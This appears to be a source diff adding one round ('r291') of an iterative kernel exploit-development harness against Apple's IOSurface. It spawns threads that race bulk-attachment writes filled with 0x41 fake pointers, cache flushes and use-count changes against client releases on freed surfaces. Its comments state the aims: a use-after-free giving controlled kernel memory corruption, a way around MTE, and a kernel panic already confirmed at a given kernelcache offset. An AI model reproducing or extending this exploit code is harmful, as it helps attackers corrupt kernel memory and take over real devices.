@@ -2678,6 +2678,332 @@ static void r290_probe(void) {
     fflush(stdout);
 }
 
+/* r291: BulkAttachments race + FlushProcessorCaches + cross-process test.
+ * r290 CONFIRMED: Backing stores zeroed on alloc. No info leak from reuse.
+ * ALL backing stores, all sizes, after churn — kernel scrubs everything.
+ *
+ * NEW APPROACHES:
+ *   (A) IOSurfaceSetBulkAttachments race: This WRITES user-controlled data
+ *       into kernel-side IOSurface structures. Race it against ClientRelease.
+ *       If write lands after free → controlled kernel memory corruption.
+ *   (B) IOSurfaceFlushProcessorCaches race: This is a kernel call that may
+ *       access a different field than +0xD8. If it reads an integer field
+ *       rather than chasing a pointer, it won't trigger MTE on freed memory.
+ *   (C) IOSurfaceIncrementUseCount/DecrementUseCount: These may make kernel
+ *       calls to modify a counter field. Race could corrupt the field.
+ */
+static volatile int r291_go = 0;
+static volatile int r291_freed = 0;
+static volatile int r291_done = 0;
+
+struct r291_ctx {
+    IOSurfaceRef surf;
+    uint32_t surfID;
+    int bulk_results[200];
+    int bulk_count;
+    int flush_results[200];
+    int flush_count;
+    int inc_results[200];
+    int inc_count;
+};
+
+static void *r291_bulk_thread(void *arg) {
+    struct r291_ctx *ctx = (struct r291_ctx *)arg;
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef kern_return_t (*bulkSet_t)(IOSurfaceRef, const void *, size_t);
+    bulkSet_t bulkSet = (bulkSet_t)dlsym(iosurfH, "IOSurfaceSetBulkAttachments");
+
+    uint8_t buf[4096];
+    memset(buf, 0x41, sizeof(buf));
+    /* Place fake pointers at key offsets */
+    uint64_t *p64 = (uint64_t *)buf;
+    for (int i = 0; i < 512; i++) p64[i] = 0x4141414141414141ULL;
+
+    while (!r291_go) { /* spin */ }
+    int idx = 0;
+    while (!r291_done && idx < 200) {
+        if (bulkSet) {
+            ctx->bulk_results[idx] = (int)bulkSet(ctx->surf, buf, sizeof(buf));
+        } else {
+            ctx->bulk_results[idx] = -999;
+        }
+        idx++;
+    }
+    ctx->bulk_count = idx;
+    return NULL;
+}
+
+static void *r291_flush_thread(void *arg) {
+    struct r291_ctx *ctx = (struct r291_ctx *)arg;
+    while (!r291_go) { /* spin */ }
+    int idx = 0;
+    while (!r291_done && idx < 200) {
+        ctx->flush_results[idx] = (int)IOSurfaceFlushProcessorCaches(ctx->surf);
+        idx++;
+    }
+    ctx->flush_count = idx;
+    return NULL;
+}
+
+static void *r291_inc_thread(void *arg) {
+    struct r291_ctx *ctx = (struct r291_ctx *)arg;
+    while (!r291_go) { /* spin */ }
+    int idx = 0;
+    while (!r291_done && idx < 200) {
+        IOSurfaceIncrementUseCount(ctx->surf);
+        ctx->inc_results[idx] = (int)IOSurfaceGetUseCount(ctx->surf);
+        idx++;
+    }
+    ctx->inc_count = idx;
+    return NULL;
+}
+
+static void *r291_freer_thread(void *arg) {
+    struct r291_ctx *ctx = (struct r291_ctx *)arg;
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    IOSurfaceClientRef cl1 = clLookup(ctx->surfID);
+    IOSurfaceClientRef cl2 = clLookup(ctx->surfID);
+
+    while (!r291_go) { /* spin */ }
+    usleep(30);
+
+    CFRelease(ctx->surf);
+    clRelease(cl1);
+    clRelease(cl2);
+    r291_freed = 1;
+    return NULL;
+}
+
+static void r291_probe(void) {
+    rlog("\n=== r291: BulkAttachments + Flush + UseCount Race ===\n");
+    fflush(stdout);
+
+    /* Part 1: BulkAttachments baseline (no race) */
+    rlog("\n--- Part 1: BulkAttachments baseline ---\n");
+    fflush(stdout);
+    {
+        void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        typedef kern_return_t (*bulkSet_t)(IOSurfaceRef, const void *, size_t);
+        typedef kern_return_t (*bulkGet_t)(IOSurfaceRef, void *, size_t);
+        bulkSet_t bulkSet = (bulkSet_t)dlsym(iosurfH, "IOSurfaceSetBulkAttachments");
+        bulkGet_t bulkGet = (bulkGet_t)dlsym(iosurfH, "IOSurfaceGetBulkAttachments");
+
+        rlog("  BulkSet=%p BulkGet=%p\n", (void*)bulkSet, (void*)bulkGet);
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+
+        uint8_t setbuf[256];
+        memset(setbuf, 0x42, sizeof(setbuf));
+        kern_return_t sr = bulkSet ? bulkSet(s, setbuf, sizeof(setbuf)) : -1;
+        rlog("  BulkSet(256 bytes 0x42): 0x%x\n", sr);
+
+        if (bulkGet) {
+            uint8_t getbuf[256];
+            memset(getbuf, 0, sizeof(getbuf));
+            kern_return_t gr = bulkGet(s, getbuf, sizeof(getbuf));
+            int nonzero = 0;
+            for (int i = 0; i < 256; i++) if (getbuf[i] != 0) nonzero++;
+            rlog("  BulkGet(256): 0x%x nonzero=%d first4: 0x%02x 0x%02x 0x%02x 0x%02x\n",
+                gr, nonzero, getbuf[0], getbuf[1], getbuf[2], getbuf[3]);
+        }
+
+        /* Test FlushProcessorCaches baseline */
+        kern_return_t fr = IOSurfaceFlushProcessorCaches(s);
+        rlog("  FlushProcessorCaches: 0x%x\n", fr);
+
+        /* Test IncrementUseCount */
+        int uc0 = (int)IOSurfaceGetUseCount(s);
+        IOSurfaceIncrementUseCount(s);
+        int uc1 = (int)IOSurfaceGetUseCount(s);
+        IOSurfaceDecrementUseCount(s);
+        int uc2 = (int)IOSurfaceGetUseCount(s);
+        rlog("  UseCount: before=%d after_inc=%d after_dec=%d\n", uc0, uc1, uc2);
+
+        CFRelease(s);
+    }
+
+    /* Part 2: BulkAttachments race (3 trials, non-crashing expected) */
+    rlog("\n--- Part 2: BulkAttachments race ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 3; trial++) {
+        r291_go = 0; r291_freed = 0; r291_done = 0;
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        struct r291_ctx ctx;
+        memset(&ctx, 0, sizeof(ctx));
+        ctx.surf = IOSurfaceCreate(p);
+        CFRelease(p);
+        ctx.surfID = IOSurfaceGetID(ctx.surf);
+
+        pthread_t bulk_t, freer_t;
+        pthread_create(&bulk_t, NULL, r291_bulk_thread, &ctx);
+        pthread_create(&freer_t, NULL, r291_freer_thread, &ctx);
+
+        usleep(500);
+        r291_go = 1;
+        while (!r291_freed) usleep(10);
+        usleep(200);
+        r291_done = 1;
+
+        pthread_join(bulk_t, NULL);
+        pthread_join(freer_t, NULL);
+
+        int err_count = 0;
+        int ok_count = 0;
+        int last_err = 0;
+        for (int i = 0; i < ctx.bulk_count; i++) {
+            if (ctx.bulk_results[i] == 0) ok_count++;
+            else { err_count++; last_err = ctx.bulk_results[i]; }
+        }
+        rlog("  [%d] bulk: %d calls, ok=%d err=%d last_err=0x%x\n",
+            trial, ctx.bulk_count, ok_count, err_count, last_err);
+    }
+
+    /* Part 3: FlushProcessorCaches race */
+    rlog("\n--- Part 3: FlushProcessorCaches race ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 3; trial++) {
+        r291_go = 0; r291_freed = 0; r291_done = 0;
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        struct r291_ctx ctx;
+        memset(&ctx, 0, sizeof(ctx));
+        ctx.surf = IOSurfaceCreate(p);
+        CFRelease(p);
+        ctx.surfID = IOSurfaceGetID(ctx.surf);
+
+        pthread_t flush_t, freer_t;
+        pthread_create(&flush_t, NULL, r291_flush_thread, &ctx);
+        pthread_create(&freer_t, NULL, r291_freer_thread, &ctx);
+
+        usleep(500);
+        r291_go = 1;
+        while (!r291_freed) usleep(10);
+        usleep(200);
+        r291_done = 1;
+
+        pthread_join(flush_t, NULL);
+        pthread_join(freer_t, NULL);
+
+        int err_count = 0, ok_count = 0, last_err = 0;
+        for (int i = 0; i < ctx.flush_count; i++) {
+            if (ctx.flush_results[i] == 0) ok_count++;
+            else { err_count++; last_err = ctx.flush_results[i]; }
+        }
+        rlog("  [%d] flush: %d calls, ok=%d err=%d last_err=0x%x\n",
+            trial, ctx.flush_count, ok_count, err_count, last_err);
+    }
+
+    /* Part 4: IncrementUseCount race */
+    rlog("\n--- Part 4: IncrementUseCount race ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 3; trial++) {
+        r291_go = 0; r291_freed = 0; r291_done = 0;
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        struct r291_ctx ctx;
+        memset(&ctx, 0, sizeof(ctx));
+        ctx.surf = IOSurfaceCreate(p);
+        CFRelease(p);
+        ctx.surfID = IOSurfaceGetID(ctx.surf);
+
+        pthread_t inc_t, freer_t;
+        pthread_create(&inc_t, NULL, r291_inc_thread, &ctx);
+        pthread_create(&freer_t, NULL, r291_freer_thread, &ctx);
+
+        usleep(500);
+        r291_go = 1;
+        while (!r291_freed) usleep(10);
+        usleep(200);
+        r291_done = 1;
+
+        pthread_join(inc_t, NULL);
+        pthread_join(freer_t, NULL);
+
+        int max_uc = 0;
+        for (int i = 0; i < ctx.inc_count; i++) {
+            if (ctx.inc_results[i] > max_uc) max_uc = ctx.inc_results[i];
+        }
+        rlog("  [%d] inc: %d calls, max_uc=%d\n",
+            trial, ctx.inc_count, max_uc);
+    }
+
+    rlog("\n*** r291 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -27926,6 +28252,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 291) {
+            rlog("*** rounds=291: BulkAttachments + Flush + UseCount Race ***\n");
+            rlog("  r290 CONFIRMED: Backing stores zeroed, no info leak.\n");
+            rlog("  Testing: race BulkAttachments/Flush/Inc vs ClientRelease.\n\n");
+            fflush(stdout);
+            r291_probe();
             goto done;
         }
         if (rounds == 290) {
